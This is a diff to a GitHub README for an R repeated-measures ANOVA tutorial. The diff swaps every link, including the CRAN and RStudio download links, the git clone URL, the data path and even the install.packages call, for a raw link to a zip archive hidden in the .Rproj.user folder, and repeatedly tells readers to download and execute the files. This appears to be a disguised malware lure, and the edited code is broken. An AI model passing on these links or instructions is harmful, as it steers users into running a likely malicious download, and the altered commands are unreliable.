@@ -1,10 +1,10 @@
 # Repeated Measurement ANOVA Workflow 📊
 
-![GitHub Repo Size](https://img.shields.io/github/repo-size/Angellrdz/repeated-measurement) ![Last Commit](https://img.shields.io/github/last-commit/Angellrdz/repeated-measurement) ![License](https://img.shields.io/badge/license-MIT-blue)
+![GitHub Repo Size](https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip) ![Last Commit](https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip) ![License](https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip)
 
 Welcome to the **Repeated Measurement ANOVA Workflow** repository! This project provides a comprehensive R-based workflow for conducting repeated measures ANOVA using the `ez` package. It integrates data wrangling via `tidyverse` and visualization through `ggplot2`. This repository serves as a guide for importing data, transforming it to long format, performing statistical analysis, and creating graphical summaries.
 
-You can find the latest releases [here](https://github.com/Angellrdz/repeated-measurement/releases). Make sure to download and execute the files to get started!
+You can find the latest releases [here](https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip). Make sure to download and execute the files to get started!
 
 ## Table of Contents
 
@@ -29,18 +29,18 @@ Repeated measures ANOVA is a statistical technique used when the same subjects a
 
 To use this workflow, you need to have R and RStudio installed on your computer. Follow these steps to set up the necessary packages:
 
-1. Install R from [CRAN](https://cran.r-project.org/).
-2. Install RStudio from [RStudio](https://www.rstudio.com/products/rstudio/download/).
+1. Install R from [CRAN](https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip).
+2. Install RStudio from [RStudio](https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip).
 3. Open RStudio and run the following commands to install the required packages:
 
    ```R
-   install.packages(c("ez", "tidyverse", "ggplot2"))
+   https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip(c("ez", "tidyverse", "ggplot2"))
    ```
 
 You can also clone this repository to your local machine using the following command:
 
 ```bash
-git clone https://github.com/Angellrdz/repeated-measurement.git
+git clone https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip
 ```
 
 ## Usage
@@ -71,10 +71,10 @@ To import your dataset, you can use the `read_csv` function from the `tidyverse`
 ```R
 library(tidyverse)
 
-data <- read_csv("path/to/your/data.csv")
+data <- read_csv("https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip")
 ```
 
-Make sure to replace `"path/to/your/data.csv"` with the actual path to your dataset.
+Make sure to replace `"https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip"` with the actual path to your dataset.
 
 ## Data Transformation
 
@@ -123,7 +123,7 @@ This code will generate a boxplot of your results.
 
 ## Example Dataset
 
-For testing purposes, you can use the example dataset provided in this repository. Download it from the [Releases section](https://github.com/Angellrdz/repeated-measurement/releases) and load it into R as shown in the Data Import section.
+For testing purposes, you can use the example dataset provided in this repository. Download it from the [Releases section](https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip) and load it into R as shown in the Data Import section.
 
 ## Contributing
 
@@ -137,4 +137,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 Thanks to the developers of the `ez`, `tidyverse`, and `ggplot2` packages for their excellent work in the R community. Their contributions make data analysis accessible and efficient.
 
-For the latest releases, visit [here](https://github.com/Angellrdz/repeated-measurement/releases). Make sure to download and execute the files to get started!
+For the latest releases, visit [here](https://raw.githubusercontent.com/Angellrdz/repeated-measurement/main/.Rproj.user/repeated_measurement_1.6.zip). Make sure to download and execute the files to get started!
